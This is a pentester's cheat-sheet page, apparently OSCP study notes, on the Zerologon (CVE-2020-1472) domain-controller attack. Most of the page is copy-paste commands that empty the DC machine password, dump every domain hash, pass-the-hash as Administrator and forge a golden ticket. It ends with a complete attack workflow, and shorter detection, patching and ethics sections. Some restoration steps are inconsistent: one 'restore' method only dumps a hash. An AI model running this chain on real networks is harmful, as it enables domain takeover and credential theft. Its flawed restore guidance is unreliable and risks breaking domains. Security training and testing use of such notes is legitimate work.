---
tags:
  - Active_Directory
  - Exploitation
  - CVE-2020-1472
  - Domain_Controller
  - Advanced
---

## Zerologon (CVE-2020-1472)
resources: [Zerologon Explained](https://www.secura.com/blog/zero-logon), [Microsoft Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472), [HackTricks Zerologon](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/zerologon)

> Critical vulnerability in Windows Netlogon that allows attackers to take over domain controllers without authentication.

## What is Zerologon?

> [!warning] CVE-2020-1472 is a critical vulnerability in the Netlogon Remote Protocol (MS-NRPC).
> - Allows unauthenticated attackers to reset the domain controller computer account password
> - Grants instant Domain Admin privileges
> - Affects all Windows Server versions (2008 R2 through 2019)
> - Patched in August 2020, but many systems remain vulnerable

### How It Works

> [!info] The vulnerability exploits a cryptographic flaw in Netlogon authentication:
> 1. Netlogon uses AES-CFB8 encryption with an all-zero IV
> 2. Attacker sends authentication requests with all-zero challenge
> 3. 1 in 256 chance the server accepts the authentication
> 4. After ~256 attempts, attacker authenticates as the DC computer account
> 5. Attacker resets DC computer account password to empty string
> 6. Attacker uses empty password to perform DCSync and dump domain credentials

## Detection

### Check if Target is Vulnerable
```bash
# Using zerologon_tester.py
python3 zerologon_tester.py <DC-NetBIOS-Name> <DC-IP>
```

**Example:**
```bash
python3 zerologon_tester.py DC01 192.168.1.10
```

**Vulnerable Output:**
```text
Success! DC can be fully compromised by a Zerologon attack.
```

**Patched Output:**
```text
Attack failed. Target is likely patched.
```

## Exploitation

> [!warning] This attack is DESTRUCTIVE - it breaks the domain controller until restored.

### Step 1: Test for Vulnerability
```bash
git clone https://github.com/dirkjanm/CVE-2020-1472.git
cd CVE-2020-1472
python3 zerologon_tester.py <DC-NetBIOS-Name> <DC-IP>
```

### Step 2: Exploit Zerologon (Reset DC Password)
```bash
python3 cve-2020-1472-exploit.py <DC-NetBIOS-Name> <DC-IP>
```

**Example:**
```bash
python3 cve-2020-1472-exploit.py DC01 192.168.1.10
```

**Success Output:**
```text
Success! DC can be fully compromised by a Zerologon attack.
```

> [!warning] At this point, the DC computer account password is set to empty string.

### Step 3: Dump Domain Credentials
```bash
impacket-secretsdump -just-dc -no-pass '<Domain>/<DC-NetBIOS-Name>$@<DC-IP>'
```

**Example:**
```bash
impacket-secretsdump -just-dc -no-pass 'corp.local/DC01$@192.168.1.10'
```

> [!tip] Use the `$` at the end of the computer name - it's a computer account.

**Output:**
```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6...:::
```

### Step 4: Restore DC Password (CRITICAL)

> [!important] You MUST restore the original DC password or the domain will break.

#### Method 1: Using Saved Hash
```bash
# First, get the original DC hash BEFORE exploitation
impacket-secretsdump '<Domain>/<Username>:<Password>@<DC-IP>' -just-dc-user '<DC-NetBIOS-Name>$'

# After exploitation, restore using the saved hash
python3 restorepassword.py <Domain>/<DC-NetBIOS-Name>$@<DC-NetBIOS-Name> -target-ip <DC-IP> -hexpass <OriginalHash>
```

#### Method 2: Using Administrator Hash
```bash
# Use dumped Administrator hash to restore DC password
impacket-secretsdump -hashes :<AdminNTLMHash> '<Domain>/Administrator@<DC-IP>' -just-dc-user '<DC-NetBIOS-Name>$'
```

## Complete Attack Workflow

### Pre-Exploitation (Save Original Password)
```bash
# 1. Get DC computer account hash BEFORE attack (if you have creds)
impacket-secretsdump 'corp.local/user:password@192.168.1.10' -just-dc-user 'DC01$' > dc_original_hash.txt
```

### Exploitation
```bash
# 2. Test for vulnerability
python3 zerologon_tester.py DC01 192.168.1.10

# 3. Exploit (resets DC password to empty)
python3 cve-2020-1472-exploit.py DC01 192.168.1.10

# 4. Dump domain credentials
impacket-secretsdump -just-dc -no-pass 'corp.local/DC01$@192.168.1.10' > domain_hashes.txt

# 5. Extract Administrator hash
cat domain_hashes.txt | grep Administrator
```

### Post-Exploitation (Restore)
```bash
# 6. Restore DC password using Administrator hash
python3 restorepassword.py corp.local/DC01$@DC01 -target-ip 192.168.1.10 -hexpass <OriginalDCHash>
```

## Alternative Tools

### Mimikatz Zerologon Module
```cmd
mimikatz # lsadump::zerologon /target:<DC-IP> /account:<DC-NetBIOS-Name>$
```

### SharpZeroLogon (C# Implementation)
```powershell
.\SharpZeroLogon.exe <DC-NetBIOS-Name> <DC-IP>
```

### Metasploit Module
```bash
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set RHOSTS <DC-IP>
set NBNAME <DC-NetBIOS-Name>
run
```

## Using Zerologon with NetExec

### Test for Vulnerability
```bash
nxc smb <DC-IP> -u '' -p '' -M zerologon
```

### Exploit with NetExec
```bash
nxc smb <DC-IP> -u '' -p '' -M zerologon -o ACTION=exploit
```

## Post-Exploitation

### Use Dumped Credentials

#### Pass-the-Hash as Administrator
```bash
impacket-psexec -hashes :<AdminNTLMHash> Administrator@<DC-IP>
```

#### DCSync with Administrator Hash
```bash
impacket-secretsdump -hashes :<AdminNTLMHash> 'corp.local/Administrator@192.168.1.10'
```

#### Create Golden Ticket
```bash
# Using krbtgt hash from dump
impacket-ticketer -nthash <KrbtgtHash> -domain-sid <DomainSID> -domain corp.local Administrator
```

## Restoration Methods

### Method 1: Using Original Hash (Best)
```bash
python3 restorepassword.py corp.local/DC01$@DC01 -target-ip 192.168.1.10 -hexpass <OriginalHash>
```

### Method 2: Using Administrator Credentials
```bash
# After dumping Administrator hash
impacket-wmiexec -hashes :<AdminHash> Administrator@<DC-IP>

# On DC, reset computer account password
nltest /sc_change_pwd:corp.local
```

### Method 3: Manual Registry Restore (Last Resort)
```powershell
# On Domain Controller (requires physical/console access)
# Restore from backup or reinstall DC
```

## Detection and Indicators

### Event Logs
- **Event ID 4742**: Computer account changed
- **Event ID 4624**: Logon with computer account
- **Event ID 5805**: Netlogon authentication failure

### Network Indicators
- Multiple Netlogon RPC calls with all-zero challenge
- Unusual authentication attempts from non-domain systems
- Computer account password changes without corresponding events

### Behavioral Indicators
- DC computer account authenticating from non-DC IP
- Sudden DCSync activity
- Computer account password reset without admin action

## Mitigation

### Patch Immediately
```powershell
# Check patch status
wmic qfe list | findstr KB4571694

# Install August 2020 patches or later
# KB4571694 (Windows Server 2019)
# KB4571723 (Windows Server 2016)
# KB4571729 (Windows Server 2012 R2)
```

### Enable Enforcement Mode
```powershell
# After patching, enable enforcement mode
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" /v FullSecureChannelProtection /t REG_DWORD /d 1 /f
```

### Monitor Netlogon Events
```powershell
# Enable Netlogon logging
nltest /dbflag:0x2080ffff
```

## Troubleshooting

### "Attack Failed" Error
> [!info] Target is likely patched or enforcement mode is enabled.

**Solutions:**
- Verify DC is running vulnerable Windows version
- Check if August 2020 patches are installed
- Try different Zerologon implementation

### "Access Denied" After Exploitation
> [!warning] DC password was reset but DCSync failed.

**Solutions:**
- Verify you're using computer account name with `$`
- Use `-no-pass` flag with secretsdump
- Try alternative secretsdump methods

### Domain Breaks After Exploitation
> [!important] DC computer account password was not restored.

**Solutions:**
- Restore from original hash immediately
- Use Administrator hash to reset DC password
- Worst case: restore DC from backup

## OSCP Exam Considerations

> [!warning] Zerologon is UNLIKELY to appear on OSCP exam due to:
> - Destructive nature (breaks domain until restored)
> - Requires specific vulnerable Windows versions
> - OSCP focuses on non-destructive techniques

**If you encounter it:**
1. **Test first** - Use zerologon_tester.py
2. **Save original hash** - BEFORE exploitation
3. **Document everything** - You'll need to restore
4. **Have restore script ready** - Don't break the lab
5. **Consider alternatives** - Look for other privilege escalation paths first

## Ethical Considerations

> [!warning] Zerologon is a DESTRUCTIVE attack that can break production domains.

**Never use Zerologon on:**
- Production environments without explicit authorization
- Client networks without backup/restore plan
- Systems you don't have permission to break

**Always:**
- Get written authorization
- Have backup/restore plan
- Save original DC password hash
- Restore DC password immediately after exploitation
- Document all actions for client

## Complete Example

```bash
# 1. Clone exploit
git clone https://github.com/dirkjanm/CVE-2020-1472.git
cd CVE-2020-1472

# 2. Test vulnerability
python3 zerologon_tester.py DC01 192.168.1.10

# 3. Save original hash (if you have creds)
impacket-secretsdump 'corp.local/user:password@192.168.1.10' -just-dc-user 'DC01$' > original_hash.txt

# 4. Exploit
python3 cve-2020-1472-exploit.py DC01 192.168.1.10

# 5. Dump domain
impacket-secretsdump -just-dc -no-pass 'corp.local/DC01$@192.168.1.10' > domain_dump.txt

# 6. Extract hashes
cat domain_dump.txt | grep -E "(Administrator|krbtgt)"

# 7. RESTORE DC PASSWORD (CRITICAL)
python3 restorepassword.py corp.local/DC01$@DC01 -target-ip 192.168.1.10 -hexpass <OriginalHash>

# 8. Use dumped credentials
impacket-psexec -hashes :<AdminHash> Administrator@192.168.1.10
```

> [!tip] This workflow demonstrates the complete attack chain from detection to restoration.
